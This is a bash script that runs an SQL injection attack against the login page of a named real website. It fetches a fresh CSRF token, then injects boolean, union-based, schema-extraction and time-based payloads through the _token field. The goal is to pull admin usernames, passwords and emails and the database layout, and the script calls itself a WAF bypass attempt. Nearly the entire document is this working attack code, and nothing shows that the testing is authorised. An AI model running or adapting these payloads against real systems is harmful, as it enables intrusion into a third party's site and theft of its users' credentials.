#!/bin/bash

echo "🔄 FRESH TOKEN ADMIN EXTRACTION"
echo "================================"

LOGIN_URL="https://member.panama8888b.co/auth/login"

echo "🔍 Phase 1: Fetching Fresh CSRF Token"
echo "======================================"

# First, get the login page to extract fresh CSRF token
echo "📊 Fetching login page for fresh token..."
login_page=$(curl -s -c cookies.txt "$LOGIN_URL")

# Extract CSRF token from the page
csrf_token=$(echo "$login_page" | grep -o 'name="_token" value="[^"]*"' | cut -d'"' -f4)

if [ -z "$csrf_token" ]; then
    echo "❌ Failed to extract CSRF token from login page"
    echo "📄 Login page content (first 500 chars):"
    echo "${login_page:0:500}"
    exit 1
fi

echo "✅ Fresh CSRF Token: $csrf_token"

echo ""
echo "🔍 Phase 2: Testing SQL Injection with Fresh Token"
echo "=================================================="

# Test boolean-based injection with fresh token
echo "📊 Testing Boolean-based Injection (1=1)..."
response1=$(curl -s -w "%{http_code}" -o /tmp/fresh_response1.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "_token=${csrf_token}' AND 1=1--")

http_code1=$(echo "$response1" | tail -n1)
content1=$(cat /tmp/fresh_response1.txt)

echo "   HTTP Code: $http_code1"
echo "   Content Length: ${#content1}"

echo ""
echo "📊 Testing Boolean-based Injection (1=2)..."
response2=$(curl -s -w "%{http_code}" -o /tmp/fresh_response2.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "_token=${csrf_token}' AND 1=2--")

http_code2=$(echo "$response2" | tail -n1)
content2=$(cat /tmp/fresh_response2.txt)

echo "   HTTP Code: $http_code2"
echo "   Content Length: ${#content2}"

echo ""
echo "🔍 Phase 3: Admin User Detection"
echo "================================"

# Test for admin users
echo "📊 Testing Admin User Detection..."
admin_test=$(curl -s -w "%{http_code}" -o /tmp/fresh_admin_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "_token=${csrf_token}' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0--")

http_code_admin=$(echo "$admin_test" | tail -n1)
content_admin=$(cat /tmp/fresh_admin_test.txt)

echo "   HTTP Code: $http_code_admin"
echo "   Content Length: ${#content_admin}"

echo ""
echo "🔍 Phase 4: Union-based Admin Extraction"
echo "========================================"

# Union-based injection
echo "📊 Testing Union-based Admin Extraction..."
union_test=$(curl -s -w "%{http_code}" -o /tmp/fresh_union_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "_token=${csrf_token}' UNION SELECT username,password,email FROM users WHERE role='admin'--")

http_code_union=$(echo "$union_test" | tail -n1)
content_union=$(cat /tmp/fresh_union_test.txt)

echo "   HTTP Code: $http_code_union"
echo "   Content Length: ${#content_union}"

echo ""
echo "🔍 Phase 5: Schema Extraction"
echo "============================="

# Schema extraction
echo "📊 Testing Schema Extraction..."
schema_test=$(curl -s -w "%{http_code}" -o /tmp/fresh_schema_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "_token=${csrf_token}' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public'--")

http_code_schema=$(echo "$schema_test" | tail -n1)
content_schema=$(cat /tmp/fresh_schema_test.txt)

echo "   HTTP Code: $http_code_schema"
echo "   Content Length: ${#content_schema}"

echo ""
echo "🔍 Phase 6: Time-based Confirmation"
echo "==================================="

# Time-based injection
echo "📊 Testing Time-based Injection..."
time_test=$(curl -s -w "%{time_total}" -o /tmp/fresh_time_test.txt \
  -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b cookies.txt \
  -d "_token=${csrf_token}' AND (SELECT SLEEP(3) FROM users WHERE role='admin' LIMIT 1)--")

echo "   Response Time: ${time_test}s"

echo ""
echo "🎯 ANALYSIS RESULTS"
echo "=================="

# Compare boolean responses
if [ "${#content1}" != "${#content2}" ]; then
    echo "✅ BOOLEAN-BASED INJECTION SUCCESSFUL!"
    echo "   Different response lengths indicate successful boolean injection"
    echo "   Length with 1=1: ${#content1}"
    echo "   Length with 1=2: ${#content2}"
else
    echo "❌ Boolean-based injection may be blocked by WAF"
fi

# Check for admin detection
if [ "$http_code_admin" = "200" ] && [ "${#content_admin}" -gt 0 ]; then
    echo "✅ ADMIN USER DETECTION SUCCESSFUL!"
    echo "   Response indicates admin users exist in database"
else
    echo "❌ Admin detection may be blocked"
fi

# Check for union injection
if [ "$http_code_union" = "200" ] && [ "${#content_union}" -gt 50 ]; then
    echo "✅ UNION-BASED EXTRACTION SUCCESSFUL!"
    echo "   Large response may contain admin data"
else
    echo "❌ Union-based extraction may be blocked"
fi

# Check for schema extraction
if [ "$http_code_schema" = "200" ] && [ "${#content_schema}" -gt 100 ]; then
    echo "✅ SCHEMA EXTRACTION SUCCESSFUL!"
    echo "   Large response may contain database schema"
else
    echo "❌ Schema extraction may be blocked"
fi

# Check time-based injection
if (( $(echo "$time_test > 2" | bc -l 2>/dev/null || echo "0") )); then
    echo "✅ TIME-BASED INJECTION SUCCESSFUL!"
    echo "   Response time: ${time_test}s indicates SQL execution"
else
    echo "❌ Time-based injection may be blocked"
fi

echo ""
echo "📋 SUMMARY"
echo "=========="
echo "Target URL: $LOGIN_URL"
echo "Method: POST with _token parameter"
echo "Technique: Fresh CSRF token + SQL Injection"
echo "Status: WAF bypass attempt with fresh authentication"

# Clean up temp files
rm -f /tmp/fresh_response1.txt /tmp/fresh_response2.txt /tmp/fresh_admin_test.txt /tmp/fresh_union_test.txt /tmp/fresh_schema_test.txt /tmp/fresh_time_test.txt cookies.txt

echo ""
echo "🔄 FRESH TOKEN ADMIN EXTRACTION COMPLETED!"